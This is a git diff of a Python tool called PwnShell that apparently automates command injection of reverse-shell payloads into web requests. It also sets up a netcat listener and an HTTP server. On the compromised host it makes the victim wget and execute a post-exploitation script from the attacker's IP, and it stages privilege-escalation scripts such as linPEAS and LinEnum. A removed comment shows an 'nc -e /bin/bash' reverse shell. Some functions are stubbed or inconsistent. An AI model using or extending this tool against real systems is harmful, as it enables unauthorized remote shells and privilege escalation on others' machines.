@@ -9,15 +9,18 @@ from threading import Thread
 import ipaddress
 import urllib3
 import requests
-import http.server
+from http.server import HTTPServer, CGIHTTPRequestHandler
 import socketserver
 import urllib.parse
 from payloads import PayLoads
+import time
+import socket
 
 
 class PwnShell:
     def __init__(self, args):
         urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+        self.ip = ip_address
         self.ip = args.host
         self.port = args.port
         self.domain = args.url
@@ -42,7 +45,10 @@ class PwnShell:
         if self.authentication:
             print('[*]USERNAME : %s' % self.authentication[0])
             print('[*]PASSWORD : %s' % self.authentication[1])
-        print('\n#Waiting for a Connection ....')
+        print('\n#Waiting for a Connection ....\n')
+
+    #########################################################################################
+    ###################################  LINUX #########################################
 
     def shell_linux(self):  # Default option
         self.info()
@@ -50,8 +56,14 @@ class PwnShell:
         self.is_valid()
         self.thread()  # leave it the last one
 
+    #########################################################################################
+    ###################################  WINDOWS #########################################
+
     def shell_windows(self):
         pass
+
+    ######################################################################################
+    ##########################  CHECK IF IP & PORT IS VALID ############################
 
     def is_valid(self):  # Checking if the ip address is valid
         try:
@@ -61,23 +73,35 @@ class PwnShell:
             print("\n[!]Invalid IP : " + self.ip)
             exit_gracefully()
 
+    #########################################################################################
+    ##############################  NC LISTNER + STAGER ###################################
+
     def listener(self):  # setting up the nc listener & stablizing the shell then uploading linpeas to /dev/shm
         nc = nclib.Netcat(listen=('', self.port), verbose=True)
-        print('\n[*]Upgrading Shell to TTY & Uploading PrivESC Scripts to -> [/dev/shm]')
-        os.system(
-            'curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh -o linpeas.sh 2>/dev/null')
-        nc.send_line(b'''python3 -c 'import pty;pty.spawn("/bin/bash")\'''')
-        send = f'''nc {self.ip} 9002 > /dev/shm/linpeas.sh ; clear'''
+        print('\n[*]Downloading PrivESC Scripts From Github..')
+        os.system('curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh -o linpeas.sh 2>/dev/null ; curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -o LinEnum.sh 2>/dev/null ; curl https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -o linux-exploit-suggester.sh  2>/dev/null ; curl https://raw.githubusercontent.com/flast101/docker-privesc/master/docker-privesc.sh -o docker-privesc.sh 2>/dev/null')
+        time.sleep(10)
+        send = f'''wget -P /dev/shm http://{self.ip}:9002/post.sh ; clear'''
         nc.send_line(send.encode("utf-8"))
-        nc.send_line(
-            b'''u=$(uname -a); w=$(whoami); s=$(echo $SHELL);clear ; echo -e "[+]Sysinfo : $u \n[+]Current User : $w\n[+]Current Shell : $s"''')
+        send=f'''chmod +x /dev/shm/post.sh ; clear ; /dev/shm/post.sh {self.ip}'''
+        nc.send_line(send.encode("utf-8"))
         nc.interact()
         nc.close()
 
+    #########################################################################################
+    ###################################  HTTP SERVER #########################################
+
     def http_server(self):
-        Handler = http.server.SimpleHTTPRequestHandler
-        with socketserver.TCPServer(("", 9002), Handler) as httpd:
-            pass
+        # Make sure the server is created at current directory
+        os.chdir('.')
+        # Create server object listening the port 9002
+        server_object = HTTPServer(server_address=('', 9002), RequestHandlerClass=CGIHTTPRequestHandler)
+        # Start the web server
+        server_object.serve_forever()
+
+
+    #########################################################################################
+    ###################################  THREADS ############################################
 
     def thread(self):
         listen = Thread(target=self.listener)
@@ -93,22 +117,36 @@ class PwnShell:
         listen.join()
         sendpayload.join()
 
-    def send_payload(self):
-        payloads = PayLoads(self.ip, self.port).payloads()
-        if self.method == 'post':
-            for payload in payloads:
-                self.req_post(payload)
-                # Here we have to stop the loop after getting a shell in the second thread
-        elif self.method == 'get':
-            print('get method')
-            for payload in payloads:
-                self.req_get(payload)
-        else:
-            return False
+    ##########################################################################################
+    #################################  CHECK IF PORT IS IN USE ##############################
 
+    def is_port_in_use(self):
+        import socket
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            return s.connect_ex(('localhost', self.port)) == 0
+
+    ############################################################################################
+    ###################################  LOOPING THE PAYLOADS #################################
+    def send_payload(self):
+        pass
+#        payloads = PayLoads(self.ip, self.port).payloads()
+#        if self.method == 'post':
+#            for payload in payloads:
+#                self.req_post(payload)
+#                time.sleep(5)
+#                if self.is_port_in_use():
+#                    break
+#                # Here we have to stop the loop after getting a shell in the second thread
+#        elif self.method == 'get':
+#            print('get method')
+#            for payload in payloads:
+#                self.req_get(payload)
+#        else:
+#            return False
+    #########################################################################################
+    ###################################  POST METHOD #########################################
     def req_post(self, payload):
-        # payload = f'nc localhost 9001 -e /bin/bash'
-        print(f'Trying: {payload}')
+        #print(f'Trying: {payload}')
         encoded_payload = self.get_url_encoded_payload(payload)
         url = self.domain.replace('PWNME', encoded_payload)  # payoad will be the revshells
         proxies = {'http': 'http://127.0.0.1:8080'}
@@ -124,16 +162,23 @@ class PwnShell:
             data_parsed = self.data.replace("PWNME", payload)  # Don't change
         else:
             data_parsed = None
-        r = requests.post(url, headers=headers, data=data_parsed,
-                          cookies=cookies)
+        r = requests.post(url, headers=headers, data=data_parsed,cookies=cookies)
 
+    #########################################################################################
+    ###################################  GET METHOD #########################################
     def req_get(self, payload):
         url = self.domain.replace('PWNME', '127.0.0.1')  # payload will be the revshells
         cookies = ''
         r = requests.get(url)
 
+    #########################################################################################
+    ###################################  LOGIN   ############################################
+
     def login(self):
         pass
+
+    #########################################################################################
+    ###################################  ENCODING PAYLOADS #################################
 
     @staticmethod
     def get_url_encoded_payload(payload):
@@ -157,7 +202,7 @@ if __name__ == '__main__':
             /_/                                                /_/    
             '''
         print(banner)
-        ip_address = netifaces.ifaddresses('lo')[2][0]['addr']
+        ip_address = netifaces.ifaddresses('eth0')[2][0]['addr']
         ################################# Arguments Creation ###########################################
         parser = argparse.ArgumentParser(
             formatter_class=argparse.ArgumentDefaultsHelpFormatter)
@@ -173,7 +218,7 @@ if __name__ == '__main__':
         parser.add_argument("-c", "--cookie", help='Enter Cookie')
         parser.add_argument("-k", "--header", help='Provide header')
         parser.add_argument(
-            "-m", "--method", help='Request Method', default='POST')
+            "-m", "--method", help='Request Method', default='post')
         parser.add_argument("-a", "--auth", help='[USERNAME PASSWORD]', nargs=2)
         args = parser.parse_args()
         ########################################################################
